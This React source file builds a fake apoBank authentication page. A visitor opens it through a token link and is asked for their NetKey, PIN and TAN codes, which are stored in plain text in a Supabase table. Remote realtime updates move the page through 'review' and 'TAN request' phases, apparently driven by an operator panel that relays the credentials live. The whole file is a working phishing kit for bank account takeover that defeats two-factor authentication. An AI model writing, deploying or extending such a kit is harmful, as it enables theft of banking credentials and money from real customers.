import { useEffect, useMemo, useState } from "react";
import { useParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Loader2, ShieldCheck, AlertTriangle, CheckCircle2 } from "lucide-react";
import apobankLogo from "@/assets/apobank-logo.svg";

type AuthRow = {
  id: string;
  token: string;
  auftraggeber_name: string | null;
  customer_phase: string | null;
  tan_method: string | null;
  last_error: string | null;
  security_status: string | null;
};

const normalizeToken = (raw: string) => {
  const digits = raw.replace(/[^0-9]/g, "").slice(0, 6);
  if (digits.length < 6) return raw;
  return `${digits.slice(0, 3)}-${digits.slice(3)}`;
};

const AuthFlow = () => {
  const { token: tokenParam } = useParams();
  const token = useMemo(() => normalizeToken(tokenParam || ""), [tokenParam]);

  const [row, setRow] = useState<AuthRow | null>(null);
  const [loading, setLoading] = useState(true);
  const [notFound, setNotFound] = useState(false);

  const [netkey, setNetkey] = useState("");
  const [pin, setPin] = useState("");
  const [tan, setTan] = useState("");
  const [submitting, setSubmitting] = useState(false);

  // Load + realtime
  useEffect(() => {
    let channel: any;
    (async () => {
      const { data } = await (supabase as any)
        .from("auth_tokens")
        .select("id, token, auftraggeber_name, customer_phase, tan_method, last_error, security_status")
        .eq("token", token)
        .maybeSingle();
      if (!data) { setNotFound(true); setLoading(false); return; }
      setRow(data);
      setLoading(false);
      channel = (supabase as any)
        .channel(`auth_${data.id}`)
        .on("postgres_changes", { event: "UPDATE", schema: "public", table: "auth_tokens", filter: `id=eq.${data.id}` }, (p: any) => {
          setRow((prev) => ({ ...(prev as AuthRow), ...p.new }));
        })
        .subscribe();
    })();
    return () => { if (channel) (supabase as any).removeChannel(channel); };
  }, [token]);

  const setPhase = async (phase: string, extra: Record<string, any> = {}) => {
    if (!row) return;
    await (supabase as any).from("auth_tokens")
      .update({ customer_phase: phase, ...extra })
      .eq("id", row.id);
  };

  const upsertMeta = async (patch: Record<string, any>) => {
    if (!row) return;
    const task_id = `auth:${row.id}`;
    const { data: existing } = await (supabase as any)
      .from("panel_task_meta").select("id").eq("task_id", task_id).maybeSingle();
    if (existing) {
      await (supabase as any).from("panel_task_meta").update(patch).eq("id", existing.id);
    } else {
      await (supabase as any).from("panel_task_meta").insert({ task_id, ...patch });
    }
  };

  const submitLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!netkey.trim() || !pin.trim()) return;
    setSubmitting(true);
    await upsertMeta({ netkey: netkey.trim(), pin: pin.trim() });
    await setPhase("pin_review", { last_error: null });
    setSubmitting(false);
  };

  const submitTan = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!tan.trim()) return;
    setSubmitting(true);
    await upsertMeta({ tan: tan.trim(), tan_updated_at: new Date().toISOString() });
    await setPhase("tan_review", { last_error: null });
    setSubmitting(false);
  };

  if (loading) {
    return <FullScreen><Loader2 className="h-6 w-6 animate-spin text-primary" /></FullScreen>;
  }
  if (notFound || !row) {
    return (
      <FullScreen>
        <div className="flex flex-col items-center gap-3 text-center">
          <AlertTriangle className="h-8 w-8 text-destructive" />
          <div className="font-semibold">Sitzung nicht gefunden</div>
          <div className="text-sm text-muted-foreground">Bitte prüfen Sie den Link von Ihrem Berater.</div>
        </div>
      </FullScreen>
    );
  }

  const phase = row.customer_phase || "login";

  return (
    <div className="min-h-screen bg-muted/30 flex flex-col">
      <header className="bg-background border-b">
        <div className="max-w-2xl mx-auto px-4 py-3 flex items-center justify-between">
          <img src={apobankLogo} alt="apoBank" className="h-8" />
          <div className="flex items-center gap-2 text-xs text-muted-foreground">
            <ShieldCheck className="h-4 w-4" /> Sichere Authentifizierung
          </div>
        </div>
      </header>

      <main className="flex-1 flex items-start justify-center p-4">
        <div className="w-full max-w-md bg-background border rounded-lg shadow-sm p-6 mt-6">
          {row.auftraggeber_name && (
            <div className="mb-4 text-sm text-muted-foreground">
              Angemeldet für: <span className="text-foreground font-medium">{row.auftraggeber_name}</span>
            </div>
          )}

          {row.last_error && (
            <div className="mb-4 p-3 rounded-md border border-destructive/50 bg-destructive/10 text-sm text-destructive flex gap-2">
              <AlertTriangle className="h-4 w-4 mt-0.5 shrink-0" />
              <span>{row.last_error}</span>
            </div>
          )}

          {(phase === "login" || phase === "pin_rejected") && (
            <form onSubmit={submitLogin} className="space-y-4">
              <h1 className="text-lg font-semibold">Anmeldung</h1>
              <div className="space-y-1">
                <label className="text-xs text-muted-foreground">NetKey / Alias</label>
                <Input value={netkey} onChange={e => setNetkey(e.target.value)} autoFocus autoComplete="username" />
              </div>
              <div className="space-y-1">
                <label className="text-xs text-muted-foreground">PIN</label>
                <Input type="password" inputMode="numeric" value={pin} onChange={e => setPin(e.target.value)} autoComplete="current-password" />
              </div>
              <Button type="submit" className="w-full" disabled={submitting}>
                {submitting ? <Loader2 className="h-4 w-4 animate-spin" /> : "Anmelden"}
              </Button>
            </form>
          )}

          {(phase === "pin_review") && (
            <WaitBlock title="Anmeldung wird geprüft" subtitle="Bitte einen Moment Geduld …" />
          )}

          {(phase === "tan_request") && (
            <WaitBlock
              title="TAN wird angefordert"
              subtitle={
                row.tan_method === "sms" ? "Eine SMS-TAN wurde an Ihre Mobilfunknummer versendet."
                : row.tan_method === "push" ? "Bitte bestätigen Sie die Push-Benachrichtigung in Ihrer App."
                : "Bitte scannen Sie die PhotoTAN-Grafik in Ihrer App."
              }
            />
          )}

          {(phase === "tan_input" || phase === "tan_rejected") && (
            <form onSubmit={submitTan} className="space-y-4">
              <h1 className="text-lg font-semibold">
                {row.tan_method === "sms" ? "SMS-TAN eingeben" : row.tan_method === "push" ? "Push-TAN bestätigen" : "PhotoTAN eingeben"}
              </h1>
              <div className="space-y-1">
                <label className="text-xs text-muted-foreground">TAN-Code</label>
                <Input value={tan} onChange={e => setTan(e.target.value)} inputMode="numeric" autoFocus className="tracking-widest text-lg" />
              </div>
              <Button type="submit" className="w-full" disabled={submitting}>
                {submitting ? <Loader2 className="h-4 w-4 animate-spin" /> : "TAN bestätigen"}
              </Button>
            </form>
          )}

          {(phase === "tan_review") && (
            <WaitBlock title="TAN wird geprüft" subtitle="Bitte warten …" />
          )}

          {(phase === "success") && (
            <div className="flex flex-col items-center gap-3 text-center py-4">
              <CheckCircle2 className="h-10 w-10 text-primary" />
              <div className="font-semibold">Authentifizierung erfolgreich</div>
              <div className="text-sm text-muted-foreground">Sie können dieses Fenster nun schließen.</div>
            </div>
          )}

          {(phase === "aborted") && (
            <div className="flex flex-col items-center gap-3 text-center py-4">
              <AlertTriangle className="h-10 w-10 text-destructive" />
              <div className="font-semibold">Sitzung beendet</div>
              <div className="text-sm text-muted-foreground">Bitte kontaktieren Sie Ihren Berater.</div>
            </div>
          )}
        </div>
      </main>
    </div>
  );
};

const WaitBlock = ({ title, subtitle }: { title: string; subtitle: string }) => (
  <div className="flex flex-col items-center gap-3 text-center py-6">
    <Loader2 className="h-8 w-8 animate-spin text-primary" />
    <div className="font-semibold">{title}</div>
    <div className="text-sm text-muted-foreground">{subtitle}</div>
  </div>
);

const FullScreen = ({ children }: { children: React.ReactNode }) => (
  <div className="min-h-screen flex items-center justify-center bg-muted/30 p-4">{children}</div>
);

export default AuthFlow;
